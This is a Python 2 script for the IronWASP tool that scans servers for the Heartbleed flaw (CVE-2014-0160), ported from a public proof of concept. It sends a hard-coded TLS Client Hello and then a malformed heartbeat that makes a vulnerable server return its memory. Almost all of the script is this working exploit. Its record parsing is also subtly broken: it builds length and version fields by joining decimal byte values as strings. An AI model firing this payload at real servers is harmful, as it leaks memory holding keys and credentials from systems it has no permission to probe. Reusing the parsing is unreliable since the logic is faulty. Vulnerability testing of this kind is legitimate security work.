#!/usr/bin/env python2

# This is IronWASP script to scan for HeartBleed Vulnerability. 
#You need to have latest version of IronWASP to run this script. Download it from www.ironwasp.org
#reference https://gist.github.com/takeshixx/10107280 

import sys
import socket
import time
import select
import re

def hexdump(s):
    #for b in xrange(0, len(s), 16):
    for b in xrange(0, len(s), 80):
        #lin = [c for c in s[b : b + 16]]
        lin = [c for c in s[b : b + 80]]
        hxdat = ' '.join('%02X' % ord(c) for c in lin)
        #pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
        pdat = ''.join((c if 32 <= ord(c) <= 126 else '' )for c in lin)
        print 'Hexdump -> %04x: %-48s Chardump -> %s' % (b, hxdat, pdat)
#        if len(pdat) > 1:
#            print 'Chardump -> %s' % (pdat)
    print

def hexdump2(byteArray):
    #for b in xrange(0, len(s), 16):
    for b in xrange(0, len(byteArray), 80):
        #lin = [c for c in s[b : b + 16]]
        start = b + 5
        end = b + 80
        if(b+80 > len(byteArray)) :
            end = len(byteArray)
        
        hxdat=''
        pdat =''
        
        for i in range(start, end):
            c = byteArray[i]
            hxdat += ' '.join('%02X' % c)
        print 'Hexdump2 -> %04x: %-48s' % (b, hxdat)
    print


def recvall(byteArray, start, length):
    rdata = ""
    length = int(length)
    end = start+ length -1
    if(len(byteArray) < end) :
        end = len(byteArray)

    for i in range(start, end):
        data = str(byteArray[i])
        rdata += data
    return rdata


def recvmsg(byteArray, start):
    if byteArray is None or len(byteArray) <= 0:
        print 'Unexpected EOF receiving record header - server closed connection'
        return None, None, None

    typ = byteArray[start]
    
#    print "Type -> " + str(typ)
    
    ver = "0"
    if byteArray[1] > 9 :
      ver = str(byteArray[1])
    else :
      ver = ver + str(byteArray[1])

    if byteArray[2] > 9 :
      ver = ver + str(byteArray[2])
    else :
      ver = ver + "0" + str(byteArray[2])

#    print "Version -> " + ver
    
    ln = "0"
    if byteArray[3] > 9 :
      ln = str(byteArray[3])
    else :
      ln = ln + str(byteArray[3])

    if byteArray[4] > 9 :
      ln = ln + str(byteArray[4])
    else :
      ln = ln + "0" + str(byteArray[4])

#    print "Length -> " + ln
    
    pay = recvall(byteArray, 5, ln)
    
    if pay is None:
        print 'Unexpected EOF receiving record payload - server closed connection'
        return None, None, None
    print " ... received message: type = " + str(typ) +  ", ver = " + ver + ", length = " + str(int(ln))
    
    return typ, ver, pay

def hit_hb(byteArray):
    typ, ver, pay = recvmsg(byteArray,0)
    if typ is None:
        print 'No heartbeat response received, server likely not vulnerable'
        return False

    if typ == 24:
        print 'Received heartbeat response:'
        #hexdump(pay)
        if len(pay) > 3:
            print '\n\n%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'
            print 'ALERT: server returned more data than it should - SERVER IS VULNERABLE!'
            print '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%\n\n'
        else:
            print 'Server processed malformed heartbeat, but did not return any extra data.'
        return True

    if typ == 21:
        print 'Received alert:'
        hexdump(pay)
        print 'Server returned error, likely not vulnerable'
        return False

def scan(target):
    sleepTime = 5000
    print "\n\n####################### Connecting -> " + target
    sys.stdout.flush()
    
    try:
      s = TcpSocket(target, 443)
    except:
      print "Connection Error... Invalid server address or port"
      return

    print 'Sending Client Hello...'
    sys.stdout.flush()
    s.Write(hello)

    print 'Waiting for Server Hello...'
    sys.stdout.flush()
    #byteArray = s.WaitAndRead()
    IronThread.Sleep(sleepTime)
    byteArray = s.Read()
    
    typ, ver, pay = recvmsg(byteArray,0)
    if typ == None:
        print 'Server closed connection without sending Server Hello.'
        return
    # Look for server hello done message.
    if typ == 22:
        print "HELLO SUCCESSFUL"
        print 'Sending heartbeat request...'
        sys.stdout.flush()
        s.Write(hb)
        #byteArray = s.WaitAndRead()
        IronThread.Sleep(sleepTime)
        byteArray = s.Read()
        #typ, ver, pay = recvmsg(byteArray,0)
        hit_hb(byteArray)
        print "DONE..."    


hexmessage = " 16 03 02 00 dc 01 00 00 d8 03 02 53 43 5b 90 9d 9b 72 0b bc 0c bc 2b 92 a8 48 97 cf bd 39 04 cc 16 0a 85 03 90 9f 77 04 33 d4 de 00 00 66 c0 14 c0 0a c0 22 c0 21 00 39 00 38 00 88 00 87 c0 0f c0 05 00 35 00 84 c0 12 c0 08 c0 1c c0 1b 00 16 00 13 c0 0d c0 03 00 0a c0 13 c0 09 c0 1f c0 1e 00 33 00 32 00 9a 00 99 00 45 00 44 c0 0e c0 04 00 2f 00 96 00 41 c0 11 c0 07 c0 0c c0 02 00 05 00 04 00 15 00 12 00 09 00 14 00 11 00 08 00 06 00 03 00 ff 01 00 00 49 00 0b 00 04 03 00 01 02 00 0a 00 34 00 32 00 0e 00 0d 00 19 00 0b 00 0c 00 18 00 09 00 0a 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0f 00 10 00 11 00 23 00 00 00 0f 00 01 01"
hello = Tools.HexToBytes(hexmessage.replace(" ", "%"))
hb = Tools.HexToBytes(" 18 03 02 00 03 01 FF FF".replace(" ", "%"))

print "\n This script is based almost entirely on the quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)"
print "\n This is just a porting of https://gist.github.com/takeshixx/10107280 to IronWasp" 
print "\n The author disclaims copyright to this source code."

#TEST DATA
scan("ADSasdfasfd_JUNK")
scan("blah-blah.com")
